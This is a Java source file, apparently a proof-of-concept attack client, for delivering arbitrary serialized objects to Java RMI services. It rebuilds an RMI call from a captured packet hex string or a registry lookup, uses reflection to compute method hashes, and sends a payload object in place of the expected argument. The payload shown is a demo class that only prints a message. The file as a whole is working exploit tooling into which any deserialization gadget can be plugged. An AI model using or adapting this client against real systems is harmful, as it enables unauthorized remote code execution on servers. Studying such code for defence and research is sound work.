package rmi.client;

import rmi.common.Vulnerable;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.*;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.time.LocalTime;
import java.util.Arrays;

public class MaliciousClient {

    public static void main(String[] args) {
        String packet  = "02000000450000a800004000400600007f0000017f000001f3a8f3a077b4fd6540a5e3b2801818e6fe9c00000101080a020f4d8e59e50a6d50aced00057722eeaa22345f3ba1519f5034f100000179ec7080638001ffffffff0a215d96fefebc2b73720012726d692e636f6d6d6f6e2e52657175657374a5cf47db57c09a220200014c00076d6573736167657400124c6a6176612f6c616e672f537472696e673b707870740005776f726c64";
        try {
            // Get WireShark packet data: Right click > ...as a Hex Stream
            MaliciousClient client = MaliciousClient.fromPacket(packet);
            client.printInfo();

            // Construct a payload
            String timestamp = "[" + LocalTime.now().toString() + "] ";
            String msg = timestamp + "Vulnerability triggered!";

            // Send payload
            client.sendObject(new Vulnerable(msg));

            // Report success
            System.out.println("Payload successfully delivered");
        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }

    public static MaliciousClient fromPacket(String packet) throws IOException {
        packet = packet.replace(" ", "");
        int idx = packet.indexOf("aced0005");
        String data = packet.substring(idx); // find serialization data

        byte[] bytes = new BigInteger(data, 16).toByteArray();
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes, 1, bytes.length); // skip sign byte
        ObjectInputStream ois = new ObjectInputStream(bis);

        ObjID objId = ObjID.read(ois);
        ois.skipBytes(4); // padding
        long methodHash = ois.readLong();
        ois.close();

        String dstSegment = packet.substring(40, 56);
        byte[] header = new BigInteger(dstSegment, 16).toByteArray();
        String address = "%d.%d.%d.%d".formatted(
                ((int) header[0]) & 0xFF,
                ((int) header[1]) & 0xFF,
                ((int) header[2]) & 0xFF,
                ((int) header[3]) & 0xFF
        );
        int port = (((int) header[6]) & 0xFF) << 8 | (((int) header[7]) & 0xFF);
        TCPEndpoint endpoint = new TCPEndpoint(address, port);
        RemoteRef ref = new UnicastRef(new LiveRef(objId, endpoint, false));

        return new MaliciousClient(ref, methodHash);
    }

    public static MaliciousClient lookup(String host, String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry(host);

        Remote remote = registry.lookup(name);
        RemoteObjectInvocationHandler handler = (RemoteObjectInvocationHandler) Proxy.getInvocationHandler(remote);
        RemoteRef ref = handler.getRef();

        // Method must take at least one parameter which is serialized as object.
        // Some primitive types, String objects, and a few others are serialized differently.
        // TODO: Support methods where any of the parameters is serialized as an Object.
        Method method = MaliciousClient.getVulnerableMethod(remote);
        long methodHash = MaliciousClient.computeMethodHash(method);

        return new MaliciousClient(ref, methodHash);
    }

    private final RemoteRef ref;
    private final long methodHash;

    public MaliciousClient(RemoteRef ref, long methodHash) {
        this.ref = ref;
        this.methodHash = methodHash;
    }

    public void printInfo() {
        try {
            LiveRef ref = ((UnicastRef) this.ref).getLiveRef();
            System.out.println("-- RMI INFO --------------------------------------------");
            System.out.println("Endpoint:        " + ref.getChannel().getEndpoint());
            System.out.println("ObjID:           " + ref.getObjID());
            System.out.println("Method hash:     " + this.methodHash);
            System.out.println("--------------------------------------------------------");
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    public void sendObject(Serializable payload) throws Exception {
        try {
            ref.invoke(DUMMY, METHOD, new Object[]{payload}, methodHash);
        } catch (IllegalArgumentException ex) {
            // ignore illegal argument exceptions from the server
        }
    }

    private static long computeMethodHash(Method method) {
        // NOTE: Requires VM option "--add-opens java.rmi/java.rmi.server=ALL-UNNAMED" as in
        //
        //    java --add-opens java.rmi/java.rmi.server=ALL-UNNAMED MaliciousClient
        //
        try {
            return (long) COMPUTE_METHOD_HASH.invoke(null, method);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static Method getVulnerableMethod(Remote remote) {
        methodSearch:
        for (Method m : remote.getClass().getInterfaces()[0].getDeclaredMethods()) {
            Class<?> param = m.getParameterTypes()[0];
            if (param.isPrimitive() || param.isArray()) {
                continue;
            }
            for (Class<?> type : Arrays.asList(String.class, Class.class, ObjectOutputStream.class, Enum.class)) {
                if (type.isAssignableFrom(param)) {
                    continue methodSearch;
                }
            }
            return m; // first parameter of m is serialized as an object
        }
        throw new IllegalArgumentException("Remote has no operation with first parameter serialized as an object");
    }

    static Method COMPUTE_METHOD_HASH;
    static Remote DUMMY = new Dummy();
    static Method METHOD;
    static {
        try {
            METHOD = MaliciousClient.class.getMethod("sendObject", Serializable.class);
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        try {
            COMPUTE_METHOD_HASH = RemoteObjectInvocationHandler.class.getDeclaredMethod("getMethodHash", Method.class);
            COMPUTE_METHOD_HASH.setAccessible(true);
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
    }

    static class Dummy implements Remote {}
}
